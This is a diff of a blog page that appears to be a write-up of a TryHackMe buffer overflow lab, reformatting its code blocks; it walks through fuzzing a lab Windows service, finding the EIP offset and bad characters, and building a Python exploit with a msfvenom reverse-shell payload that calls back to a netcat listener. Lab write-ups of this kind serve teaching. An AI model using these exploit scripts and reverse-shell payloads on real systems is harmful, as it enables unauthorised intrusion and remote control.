@@ -18,6 +18,21 @@ related_publications: false
 <h2>Link</h2>
 <a href="https://tryhackme.com/room/bufferoverflowprep">Room Link</a>
 
+<br />
+<h2>Table of Contents</h2>
+<ol>
+    <li><a href="#overflow1">Overflow 1</a></li>
+    <li><a href="#overflow2">Overflow 2</a></li>
+    <li><a href="#overflow3">Overflow 3</a></li>
+    <li><a href="#overflow4">Overflow 4</a></li>
+    <li><a href="#overflow5">Overflow 5</a></li>
+    <li><a href="#overflow6">Overflow 6</a></li>
+    <li><a href="#overflow7">Overflow 7</a></li>
+    <li><a href="#overflow8">Overflow 8</a></li>
+    <li><a href="#overflow9">Overflow 9</a></li>
+    <li><a href="#overflow10">Overflow 10</a></li>
+</ol>
+
 <br/>
 <h2>Process</h2>
 
@@ -26,8 +41,11 @@ Time to take on some Buffer Overflow Prep.  There are 10 different commands that
 
 So, let's get started.
 
-<b><u>OVERFLOW1<br /></u></b>
+<div id="overflow1">
+    <b><u>OVERFLOW1<br /></u></b>
+</div>
 
+<br />
 Open up WinDbg and attach the executable.
 
 <div class="row justify-content-sm-center">
@@ -57,8 +75,7 @@ Click the button that looks like a file with the recycle symbol.  You can also u
 <br />
 Create a python program to socket connect to the service and send it OVERFLOW1 command under normal usage.
 
-{% raw %}
-```python
+{% capture of100 %}
 import socket
 
 url = '10.0.0.7'
@@ -72,15 +89,15 @@ print(s.recv(1024))
 s.send(b'OVERFLOW1 aaaa\r\n')
 print(s.recv(1024))
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+
+{% include terminal.html language="python" title="of1_0x00.py" content=of100 %}
 
 <br />
 Update the script that was just create to fuzz the OVERFLOW1 to send increasingly bigger strings to try and find the break size.
 
-{% raw %}
-```python
+{% capture of101 %}
 import socket
 
 url = '10.0.0.7'
@@ -103,16 +120,15 @@ for inputBuffer in buffers:
     s.send(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
     s.recv(1024)
 
-    s.close() 
-```
-{% endraw %}
+    s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of1_0x01.py' content=of101 %}
 
 <br />
 Run the script and notice that point that it hangs and gives a time out.
 
-{% raw %}
-```python
-= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW1/thm-overflow1_0x00.py
+{% capture of1findbreak %}
+= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW1/of1_0x01.py
 [*] Sending: 1
 [*] Sending: 100
 [*] Sending: 200
@@ -135,11 +151,12 @@ Run the script and notice that point that it hangs and gives a time out.
 [*] Sending: 1900
 [*] Sending: 2000
 Traceback (most recent call last):
-  File "/home/kali/Documents/thm/bufferoverflowprep/OVERFLOW1/thm-overflow1_0x00.py", line 21, in <module>
+  File "/home/kali/Documents/thm/bufferoverflowprep/OVERFLOW1/of1_0x01.py", line 21, in <module>
     s.recv(1024)
-TimeoutError: timed out 
-```
-{% endraw %}
+TimeoutError: timed out
+{% endcapture %}
+
+{% include terminal.html language="bash" title="bash" content=of1findbreak %}
 
 <br />
 Check the EIP to ensure that our 41s are there indicating that we have control of the address.
@@ -162,8 +179,7 @@ Check the ESP register to see the rest of our payload.  This is <i>PROBABLY</i> 
 <br />
 Update the code to hardcode the breakpoint and add 400 the attack string to make room for the payload.  Run the code again and check EIP.  Sometimes, when you change the size, you change how the program functions.  We need to confirm that we still have EIP.
 
-{% raw %}
-```python
+{% capture of102 %}
 import socket
 
 url = '10.0.0.7'
@@ -180,9 +196,9 @@ s.recv(1024)
 print('[*] Sending payload')
 s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of1_0x02.py' content=of102 %}
 
 <br />
 Check the ESP to see all of our new As in the ESP register.
@@ -196,19 +212,17 @@ Check the ESP to see all of our new As in the ESP register.
 <br />
 Use msf-pattern_create to generate a string that is unique that can be used to determine the EIP offset.
 
-{% raw %}
-```bash
+{% capture 0f1patterncreate %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
 └─$ msf-pattern_create -l 2400 
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9 
-```
-{% endraw %}
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=0f1patterncreate %}
 
 <br />
 Update the code to include the string that we just generated.
 
-{% raw %}
-```python
+{% capture of103 %}
 import socket
 
 url = '10.0.0.7'
@@ -226,9 +240,9 @@ s.recv(1024)
 print('[*] Sending payload')
 s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of1_0x03.py' content=of103 %}
 
 <br />
 Check the EIP and note the value that is stored in the register.
@@ -242,19 +256,17 @@ Check the EIP and note the value that is stored in the register.
 <br />
 Use the value from EIP in msf-patter_offset to get the offset value.
 
-{% raw %}
-```bash
+{% capture of1findoffset %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
 └─$ msf-pattern_offset -l 2400 -q 6f43396e
-[*] Exact match at offset 1978 
-```
-{% endraw %}
+[*] Exact match at offset 1978
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of1findoffset %}
 
 <br />
 Update the code to incorporate the offset value in your attack string.
 
-{% raw %}
-```python
+{% capture of104 %}
 import socket
 
 url = '10.0.0.7'
@@ -274,8 +286,8 @@ print('[*] Sending payload')
 s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
 
 s.close() 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of1_0x04.py' content=of104 %}
 
 <br />
 Run the code and check the eip.  If you see 42s in the register, it means your offset is correct.
@@ -289,8 +301,7 @@ Run the code and check the eip.  If you see 42s in the register, it means your o
 <br />
 Get a list of the badchars (minus \x00) and add it to the code.
 
-{% raw %}
-```python
+{% capture of105 %}
 import socket
 
 url = '10.0.0.7'
@@ -332,8 +343,8 @@ print('[*] Sending payload')
 s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
 
 s.close() 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of1_0x05.py' content=of105 %}
 
 <br />
 Check the ESP register.  Look at the characters and look for any mangles or drops.  Notice \x07 gets replaced with \x0a\x0d.
@@ -344,10 +355,10 @@ Check the ESP register.  Look at the characters and look for any mangles or drop
     </div>
 </div>
 
-Since line feed and carriage return are not \07 it will have to be removed.
+<br />
+Since line feed and carriage return are not \x07 it will have to be removed.
 
-{% raw %}
-```python
+{% capture of106 %}
 import socket
 
 url = '10.0.0.7'
@@ -389,14 +400,13 @@ print('[*] Sending payload')
 s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
 
 s.close() 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of1_0x06.py' content=of106 %}
 
 <br />
 Keep removing any mangled characters and reviewing the ESP.  Eventually, you should have a clean run.
 
-{% raw %}
-```python
+{% capture of107 %}
 import socket
 
 url = '10.0.0.7'
@@ -438,14 +448,13 @@ print('[*] Sending payload')
 s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
 
 s.close() 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of1_0x07.py' content=of107 %}
 
 <br />
 Update the code to remove the badchars and put in a stub for the payload.
 
-{% raw %}
-```python
+{% capture of108 %}
 import socket
 
 url = '10.0.0.7'
@@ -470,8 +479,8 @@ print('[*] Sending payload')
 s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
 
 s.close() 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of1_0x08.py' content=of108 %}
 
 <br />
 Load the narly plugin in WinDBG.
@@ -494,14 +503,13 @@ Run !nmod to get a list of the modules and the security associated with them.  W
 <br />
 Run jmp esp through msf-nasm_shell to get the opcode equivalent.
 
-{% raw %}
-```bash
+{% capture of1nasmshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
 └─$ msf-nasm_shell                        
 nasm > jmp esp
-00000000  FFE4              jmp esp 
-```
-{% endraw %}
+00000000  FFE4              jmp esp
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of1nasmshell %}
 
 <br />
 In WinDBG, search the address range for essfunc.dll looking for jmp esp.
@@ -524,8 +532,7 @@ Set a breakpoint and the address that we found.
 <br />
 Update the code with the address that we found.
 
-{% raw %}
-```python
+{% capture of109 %}
 import socket
 from struct import pack
 
@@ -551,8 +558,8 @@ print('[*] Sending payload')
 s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
 
 s.close() 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of1_0x09.py' content=of109 %}
 
 <br />
 Run the code and check to see if we hit the breakpoint in WinDBG.
@@ -575,8 +582,7 @@ Move the code forward and we should see the 44s from the payload stub.
 <br />
 Use msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture of1genpayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -b '\x00\x07\x2e\xa0' -v payload
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -620,14 +626,13 @@ payload += b"\xb4\x45\x08\x3e\x79\x02\x9c\x47\x67\xb2\x63"
 payload += b"\x92\x23\xd2\x81\x36\x5e\x7b\x1c\xd3\xe3\xe6"
 payload += b"\x9f\x0e\x27\x1f\x1c\xba\xd8\xe4\x3c\xcf\xdd"
 payload += b"\xa1\xfa\x3c\xac\xba\x6e\x42\x03\xba\xba" 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of1genpayload %}
 
 <br />
 Update the code with the payload the we just generated.
 
-{% raw %}
-```python
+{% capture of10a %}
 import socket
 from struct import pack
 
@@ -685,14 +690,13 @@ print('[*] Sending payload')
 s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
 
 s.close() 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of1_0x0a.py' content=of10a %}
 
 <br />
 Update the code with a nop sled.
 
-{% raw %}
-```python
+{% capture of10b %}
 import socket
 from struct import pack
 
@@ -751,45 +755,52 @@ print('[*] Sending payload')
 s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
 
 s.close() 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of1_0x0b.py' content=of10b %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ... 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Run the code and catch the shell.
 
-{% raw %}
-```bash
+{% capture of1catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56175
+Host is up (0.25s latency).
+{% endcapture %}
+
+{% capture of1windowsshell %}
 Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Windows Kits\10\Debuggers> 
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=of1catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=of1windowsshell %}
 
 <br />
-<b><u>OVERFLOW2<br /></u></b>
+<div id="overflow2">
+    <b><u>OVERFLOW2<br /></u></b>
+</div>
 
+<br />
 Create a script that connects to the service and sends the OVERFLOW2 command mimicking normal usage.
 
-{% raw %}
-```python
+{% capture of200 %}
 import socket
 
 url = '10.0.0.7'
@@ -804,14 +815,13 @@ s.send(b'OVERFLOW2 aaaa\r\n')
 print(s.recv(1024))
 
 s.close() 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of2_0x00.py' content=of200 %}
 
 <br />
 Update the code to fuzz the command with increasing length to find the breakpoint.
 
-{% raw %}
-```python
+{% capture of201 %}
 import socket
 
 url = '10.0.0.7'
@@ -833,16 +843,15 @@ for inputBuffer in buffers:
     s.send(b'OVERFLOW2 ' + inputBuffer + b'\r\n')
     s.recv(1024)
 
-    s.close() 
-```
-{% endraw %}
+    s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of2_0x01.py' content=of201 %}
 
 <br />
 Run the code and observe the breakpoint.
 
-{% raw %}
-```python
-= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW2/thm-overflow2_0x00.py
+{% capture 0f2findbreak %}
+= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW2/of2_0x01.py
 [*] Sending: 1
 [*] Sending: 100
 [*] Sending: 200
@@ -851,8 +860,8 @@ Run the code and observe the breakpoint.
 [*] Sending: 500
 [*] Sending: 600
 [*] Sending: 700 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=0f2findbreak %}
 
 <br />
 Check the EIP to ensure that our 41s are in the register.
@@ -866,8 +875,7 @@ Check the EIP to ensure that our 41s are in the register.
 <br />
 Update the code to hardcode the break value.  Add 400 to the string to make room for the payload.
 
-{% raw %}
-```python
+{% capture of202 %}
 import socket
 
 url = '10.0.0.7'
@@ -883,9 +891,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of2_0x02.py' content=of202 %}
 
 <br />
 Run the code and check the EIP and ensure that we still have the 41s.
@@ -899,19 +907,17 @@ Run the code and check the EIP and ensure that we still have the 41s.
 <br />
 Use msf-pattern_create to generate a string that we can use to determine the offset.
 
-{% raw %}
-```bash
+{% capture of2patterncreate %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
 └─$ msf-pattern_create -l 1100
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk 
-```
-{% endraw %}
